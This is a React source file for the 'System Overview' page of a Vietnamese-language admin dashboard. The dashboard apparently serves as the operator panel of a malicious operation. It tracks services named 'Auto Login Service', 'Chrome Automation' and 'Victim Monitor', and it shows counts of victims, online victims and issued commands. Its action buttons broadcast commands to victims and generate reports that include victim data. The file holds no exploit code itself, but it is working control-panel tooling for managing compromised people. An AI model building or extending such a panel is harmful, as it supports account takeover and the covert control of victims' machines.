import React, { useState, useEffect } from "react";
import { motion } from "framer-motion";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from "../components/ui/card";
import { Badge } from "../components/ui/badge";
import { Button } from "../components/ui/button";
import {
  Server,
  Cpu,
  MemoryStick,
  HardDrive,
  Wifi,
  Users,
  Activity,
  Database,
  Shield,
  Globe,
  Clock,
  AlertCircle,
  CheckCircle,
  RefreshCw,
  Zap,
  Bot,
  Chrome,
  Eye,
} from "lucide-react";
import { useSocket } from "../hooks/useSocket";
import { restAdaptor } from "../adaptors";
import { useToast } from "../components/ui/use-toast";

const SystemOverviewPage = () => {
  const [systemStats, setSystemStats] = useState(null);
  const [services, setServices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [lastUpdated, setLastUpdated] = useState(new Date());
  const { socket, isConnected } = useSocket();
  const { toast } = useToast();

  // Mock system data
  const generateMockSystemStats = () => ({
    server: {
      uptime: "2 days, 14 hours, 32 minutes",
      cpu: {
        usage: 35.2,
        cores: 8,
        model: "Intel Core i7-10700K @ 3.80GHz",
      },
      memory: {
        used: 6.2,
        total: 16,
        usage: 38.75,
      },
      disk: {
        used: 120.5,
        total: 512,
        usage: 23.5,
      },
      network: {
        rx: "2.3 GB",
        tx: "1.8 GB",
        connections: 45,
      },
    },
    database: {
      status: "healthy",
      connections: 12,
      queries: 1247,
      avgResponseTime: 23,
    },
    realtime: {
      websocketConnections: 8,
      messagesPerMinute: 156,
      uptime: "2 days, 14 hours",
    },
    security: {
      activeTokens: 15,
      failedLogins: 3,
      blockedIPs: 2,
    },
  });

  const generateMockServices = () => [
    {
      id: "backend-api",
      name: "Backend API",
      status: "healthy",
      port: 3000,
      uptime: "2d 14h",
      requests: 2847,
      errors: 12,
      avgResponse: 145,
    },
    {
      id: "websocket",
      name: "WebSocket Server",
      status: "healthy",
      port: 3000,
      uptime: "2d 14h",
      connections: 8,
      messages: 1247,
      avgLatency: 23,
    },
    {
      id: "auto-login",
      name: "Auto Login Service",
      status: "healthy",
      port: null,
      uptime: "2d 14h",
      requests: 156,
      success: 142,
      pending: 14,
    },
    {
      id: "chrome-automation",
      name: "Chrome Automation",
      status: "warning",
      port: null,
      uptime: "1d 8h",
      profiles: 12,
      active: 3,
      errors: 5,
    },
    {
      id: "victim-monitor",
      name: "Victim Monitor",
      status: "healthy",
      port: null,
      uptime: "2d 14h",
      victims: 2,
      online: 1,
      commands: 45,
    },
  ];

  // Load system data
  useEffect(() => {
    const loadSystemData = async () => {
      try {
        setLoading(true);

        // Try to load real system stats
        try {
          const response = await restAdaptor.get("/system/stats");
          if (response.success) {
            setSystemStats(response.data);
          } else {
            throw new Error("No real data");
          }
        } catch {
          setSystemStats(generateMockSystemStats());
        }

        // Try to load services
        try {
          const response = await restAdaptor.get("/system/services");
          if (response.success) {
            setServices(response.data);
          } else {
            throw new Error("No real data");
          }
        } catch {
          setServices(generateMockServices());
        }

        setLastUpdated(new Date());
      } catch (error) {
        toast({
          title: "Lỗi!",
          description: "Không thể tải thông tin hệ thống",
          variant: "destructive",
        });
      } finally {
        setLoading(false);
      }
    };

    loadSystemData();
  }, [toast]);

  // Auto refresh every 30 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      if (!loading) {
        setLastUpdated(new Date());
        // Update some stats to simulate real-time changes
        setSystemStats((prev) =>
          prev
            ? {
                ...prev,
                server: {
                  ...prev.server,
                  cpu: { ...prev.server.cpu, usage: Math.random() * 50 + 20 },
                  memory: {
                    ...prev.server.memory,
                    usage: Math.random() * 20 + 30,
                  },
                },
              }
            : null
        );
      }
    }, 30000);

    return () => clearInterval(interval);
  }, [loading]);

  const getStatusColor = (status) => {
    switch (status) {
      case "healthy":
        return "bg-green-500/20 text-green-400 border-green-500/30";
      case "warning":
        return "bg-yellow-500/20 text-yellow-400 border-yellow-500/30";
      case "error":
        return "bg-red-500/20 text-red-400 border-red-500/30";
      default:
        return "bg-gray-500/20 text-gray-400 border-gray-500/30";
    }
  };

  const getStatusIcon = (status) => {
    switch (status) {
      case "healthy":
        return CheckCircle;
      case "warning":
        return AlertCircle;
      case "error":
        return AlertCircle;
      default:
        return Clock;
    }
  };

  const formatBytes = (bytes) => {
    const sizes = ["B", "KB", "MB", "GB", "TB"];
    if (bytes === 0) return "0 B";
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return Math.round((bytes / Math.pow(1024, i)) * 100) / 100 + " " + sizes[i];
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center">
        <div className="text-center">
          <RefreshCw className="w-12 h-12 animate-spin mx-auto mb-4 text-blue-500" />
          <p>Đang tải thông tin hệ thống...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="max-w-7xl mx-auto"
      >
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center justify-between mb-6">
            <div>
              <h1 className="text-3xl font-bold flex items-center gap-3">
                <Server className="w-8 h-8 text-blue-500" />
                System Overview
              </h1>
              <p className="text-gray-400 mt-2">
                Giám sát tổng quan hệ thống và các dịch vụ
              </p>
            </div>
            <div className="flex items-center gap-2">
              <Badge
                className={`${
                  isConnected
                    ? "bg-green-500/20 text-green-400"
                    : "bg-red-500/20 text-red-400"
                } border-0`}
              >
                {isConnected ? "Realtime ON" : "Realtime OFF"}
              </Badge>
              <Badge className="bg-blue-500/20 text-blue-400 border-0">
                Cập nhật: {lastUpdated.toLocaleTimeString("vi-VN")}
              </Badge>
              <Button
                onClick={() => {
                  toast({
                    title: "🔄 Refreshing System Overview",
                    description: "Đang tải lại thống kê hệ thống mới nhất",
                    duration: 2000,
                  });
                  window.location.reload();
                }}
                variant="outline"
                className="border-gray-600 hover:bg-gray-700 hover:scale-105 active:scale-95 transition-all duration-200 hover:shadow-md"
              >
                <RefreshCw className="w-4 h-4 mr-2" />
                Làm mới
              </Button>
            </div>
          </div>
        </div>

        {/* System Stats Grid */}
        {systemStats && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            {/* CPU */}
            <Card className="bg-gray-800/70 border-gray-700">
              <CardHeader className="pb-3">
                <CardTitle className="text-lg flex items-center gap-2">
                  <Cpu className="w-5 h-5 text-orange-500" />
                  CPU
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Usage:</span>
                    <span className="text-white font-medium">
                      {systemStats.server.cpu.usage.toFixed(1)}%
                    </span>
                  </div>
                  <div className="w-full bg-gray-700 rounded-full h-2">
                    <div
                      className="bg-orange-500 h-2 rounded-full transition-all"
                      style={{ width: `${systemStats.server.cpu.usage}%` }}
                    />
                  </div>
                  <div className="text-xs text-gray-500">
                    {systemStats.server.cpu.cores} cores •{" "}
                    {systemStats.server.cpu.model}
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Memory */}
            <Card className="bg-gray-800/70 border-gray-700">
              <CardHeader className="pb-3">
                <CardTitle className="text-lg flex items-center gap-2">
                  <MemoryStick className="w-5 h-5 text-blue-500" />
                  Memory
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Used:</span>
                    <span className="text-white font-medium">
                      {systemStats.server.memory.used} GB /{" "}
                      {systemStats.server.memory.total} GB
                    </span>
                  </div>
                  <div className="w-full bg-gray-700 rounded-full h-2">
                    <div
                      className="bg-blue-500 h-2 rounded-full transition-all"
                      style={{ width: `${systemStats.server.memory.usage}%` }}
                    />
                  </div>
                  <div className="text-xs text-gray-500">
                    {systemStats.server.memory.usage.toFixed(1)}% used
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Disk */}
            <Card className="bg-gray-800/70 border-gray-700">
              <CardHeader className="pb-3">
                <CardTitle className="text-lg flex items-center gap-2">
                  <HardDrive className="w-5 h-5 text-green-500" />
                  Storage
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Used:</span>
                    <span className="text-white font-medium">
                      {systemStats.server.disk.used} GB /{" "}
                      {systemStats.server.disk.total} GB
                    </span>
                  </div>
                  <div className="w-full bg-gray-700 rounded-full h-2">
                    <div
                      className="bg-green-500 h-2 rounded-full transition-all"
                      style={{ width: `${systemStats.server.disk.usage}%` }}
                    />
                  </div>
                  <div className="text-xs text-gray-500">
                    {systemStats.server.disk.usage.toFixed(1)}% used
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Network */}
            <Card className="bg-gray-800/70 border-gray-700">
              <CardHeader className="pb-3">
                <CardTitle className="text-lg flex items-center gap-2">
                  <Wifi className="w-5 h-5 text-purple-500" />
                  Network
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">RX:</span>
                    <span className="text-white">
                      {systemStats.server.network.rx}
                    </span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">TX:</span>
                    <span className="text-white">
                      {systemStats.server.network.tx}
                    </span>
                  </div>
                  <div className="text-xs text-gray-500">
                    {systemStats.server.network.connections} active connections
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Services Status */}
        <Card className="bg-gray-800/70 border-gray-700 mb-8">
          <CardHeader>
            <CardTitle className="text-xl flex items-center gap-2">
              <Activity className="w-6 h-6 text-blue-500" />
              Services Status
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              {services.map((service) => {
                const StatusIcon = getStatusIcon(service.status);
                return (
                  <div
                    key={service.id}
                    className="bg-gray-900/50 p-4 rounded-lg border border-gray-700"
                  >
                    <div className="flex items-center justify-between mb-3">
                      <h3 className="font-medium text-white flex items-center gap-2">
                        {service.name === "Backend API" && (
                          <Server className="w-4 h-4" />
                        )}
                        {service.name === "WebSocket Server" && (
                          <Wifi className="w-4 h-4" />
                        )}
                        {service.name === "Auto Login Service" && (
                          <Zap className="w-4 h-4" />
                        )}
                        {service.name === "Chrome Automation" && (
                          <Chrome className="w-4 h-4" />
                        )}
                        {service.name === "Victim Monitor" && (
                          <Eye className="w-4 h-4" />
                        )}
                        {service.name}
                      </h3>
                      <Badge
                        className={`${getStatusColor(
                          service.status
                        )} border flex items-center gap-1`}
                      >
                        <StatusIcon className="w-3 h-3" />
                        {service.status}
                      </Badge>
                    </div>

                    <div className="grid grid-cols-2 gap-2 text-sm">
                      {service.port && (
                        <div>
                          <span className="text-gray-400">Port:</span>
                          <span className="text-white ml-2">
                            {service.port}
                          </span>
                        </div>
                      )}
                      <div>
                        <span className="text-gray-400">Uptime:</span>
                        <span className="text-white ml-2">
                          {service.uptime}
                        </span>
                      </div>

                      {service.requests !== undefined && (
                        <>
                          <div>
                            <span className="text-gray-400">Requests:</span>
                            <span className="text-white ml-2">
                              {service.requests}
                            </span>
                          </div>
                          <div>
                            <span className="text-gray-400">Errors:</span>
                            <span className="text-red-400 ml-2">
                              {service.errors}
                            </span>
                          </div>
                        </>
                      )}

                      {service.connections !== undefined && (
                        <div>
                          <span className="text-gray-400">Connections:</span>
                          <span className="text-white ml-2">
                            {service.connections}
                          </span>
                        </div>
                      )}

                      {service.victims !== undefined && (
                        <>
                          <div>
                            <span className="text-gray-400">Victims:</span>
                            <span className="text-white ml-2">
                              {service.victims}
                            </span>
                          </div>
                          <div>
                            <span className="text-gray-400">Online:</span>
                            <span className="text-green-400 ml-2">
                              {service.online}
                            </span>
                          </div>
                        </>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </CardContent>
        </Card>

        {/* Quick Stats */}
        {systemStats && (
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <Card className="bg-gray-800/70 border-gray-700">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <Database className="w-5 h-5 text-green-500" />
                  Database
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Status:</span>
                    <Badge className="bg-green-500/20 text-green-400 border-green-500/30 border">
                      {systemStats.database.status}
                    </Badge>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Connections:</span>
                    <span className="text-white">
                      {systemStats.database.connections}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Queries:</span>
                    <span className="text-white">
                      {systemStats.database.queries}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Avg Response:</span>
                    <span className="text-white">
                      {systemStats.database.avgResponseTime}ms
                    </span>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-gray-800/70 border-gray-700">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <Wifi className="w-5 h-5 text-blue-500" />
                  Realtime
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">WebSocket:</span>
                    <span className="text-white">
                      {systemStats.realtime.websocketConnections}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Messages/min:</span>
                    <span className="text-white">
                      {systemStats.realtime.messagesPerMinute}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Uptime:</span>
                    <span className="text-white">
                      {systemStats.realtime.uptime}
                    </span>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-gray-800/70 border-gray-700">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <Shield className="w-5 h-5 text-red-500" />
                  Security
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Active Tokens:</span>
                    <span className="text-white">
                      {systemStats.security.activeTokens}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Failed Logins:</span>
                    <span className="text-yellow-400">
                      {systemStats.security.failedLogins}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Blocked IPs:</span>
                    <span className="text-red-400">
                      {systemStats.security.blockedIPs}
                    </span>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* System Actions */}
        <div className="mt-8">
          <Card className="bg-gray-800/70 border-gray-700">
            <CardHeader>
              <CardTitle className="text-xl flex items-center gap-2">
                <Zap className="w-6 h-6 text-yellow-500" />
                System Actions
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <Button
                  onClick={async () => {
                    try {
                      toast({
                        title: "🔄 Restarting Services",
                        description:
                          "Đang khởi động lại tất cả dịch vụ hệ thống",
                        duration: 3000,
                      });

                      // Call real API to restart services
                      await restAdaptor.post("/system/restart-services", {
                        services: ["websocket", "api", "automation", "chrome"],
                      });

                      // Also notify all victims about system restart
                      await restAdaptor.post("/victims/broadcast", {
                        command: "system_restart_notice",
                        message:
                          "System services are restarting, please wait...",
                      });

                      toast({
                        title: "✅ Services Restarted",
                        description:
                          "Tất cả dịch vụ đã được khởi động lại thành công",
                        duration: 3000,
                      });
                    } catch (error) {
                      toast({
                        title: "❌ Restart Failed",
                        description: `Lỗi khởi động lại: ${error.message}`,
                        variant: "destructive",
                      });
                    }
                  }}
                  className="bg-blue-600 hover:bg-blue-700 hover:scale-105 active:scale-95 transition-all duration-200 hover:shadow-blue-500/25"
                >
                  <RefreshCw className="w-4 h-4 mr-2" />
                  Restart Services
                </Button>

                <Button
                  onClick={async () => {
                    try {
                      toast({
                        title: "🧹 Clearing Cache",
                        description: "Đang xóa cache hệ thống và tạm thời",
                        duration: 3000,
                      });

                      // Call real API to clear cache
                      await restAdaptor.delete("/system/cache");

                      // Clear victim-related cache as well
                      await restAdaptor.delete("/victims/cache");

                      toast({
                        title: "✅ Cache Cleared",
                        description: "Tất cả cache đã được xóa thành công",
                        duration: 3000,
                      });
                    } catch (error) {
                      toast({
                        title: "❌ Clear Cache Failed",
                        description: `Lỗi xóa cache: ${error.message}`,
                        variant: "destructive",
                      });
                    }
                  }}
                  className="bg-purple-600 hover:bg-purple-700 hover:scale-105 active:scale-95 transition-all duration-200 hover:shadow-purple-500/25"
                >
                  <Database className="w-4 h-4 mr-2" />
                  Clear Cache
                </Button>

                <Button
                  onClick={async () => {
                    try {
                      toast({
                        title: "📊 Generating Report",
                        description: "Đang tạo báo cáo hiệu suất hệ thống",
                        duration: 3000,
                      });

                      // Call real API to generate system report
                      const report = await restAdaptor.post(
                        "/system/generate-report",
                        {
                          includeVictims: true,
                          includeFeedback: true,
                          includePerformance: true,
                          timeRange: "24h",
                        }
                      );

                      // Download the report or show success
                      if (report.downloadUrl) {
                        window.open(report.downloadUrl, "_blank");
                      }

                      toast({
                        title: "✅ Report Generated",
                        description: `Báo cáo đã được tạo với ${
                          report.totalRecords || "N/A"
                        } bản ghi`,
                        duration: 3000,
                      });
                    } catch (error) {
                      toast({
                        title: "❌ Report Generation Failed",
                        description: `Lỗi tạo báo cáo: ${error.message}`,
                        variant: "destructive",
                      });
                    }
                  }}
                  className="bg-green-600 hover:bg-green-700 hover:scale-105 active:scale-95 transition-all duration-200 hover:shadow-green-500/25"
                >
                  <Activity className="w-4 h-4 mr-2" />
                  Generate Report
                </Button>

                <Button
                  onClick={async () => {
                    try {
                      toast({
                        title: "🔧 System Maintenance",
                        description: "Đang thực hiện bảo trì hệ thống",
                        duration: 3000,
                      });

                      // Call real API to start maintenance mode
                      await restAdaptor.post("/system/maintenance", {
                        mode: "start",
                        notifyVictims: true,
                        estimatedDuration: "15m",
                      });

                      // Notify all victims about maintenance
                      await restAdaptor.post("/victims/broadcast", {
                        command: "maintenance_mode",
                        message:
                          "System is entering maintenance mode. Please wait...",
                      });

                      toast({
                        title: "✅ Maintenance Mode Active",
                        description: "Hệ thống đã chuyển sang chế độ bảo trì",
                        duration: 3000,
                      });
                    } catch (error) {
                      toast({
                        title: "❌ Maintenance Failed",
                        description: `Lỗi bảo trì: ${error.message}`,
                        variant: "destructive",
                      });
                    }
                  }}
                  className="bg-orange-600 hover:bg-orange-700 hover:scale-105 active:scale-95 transition-all duration-200 hover:shadow-orange-500/25"
                >
                  <Server className="w-4 h-4 mr-2" />
                  Maintenance
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      </motion.div>
    </div>
  );
};

export default SystemOverviewPage;
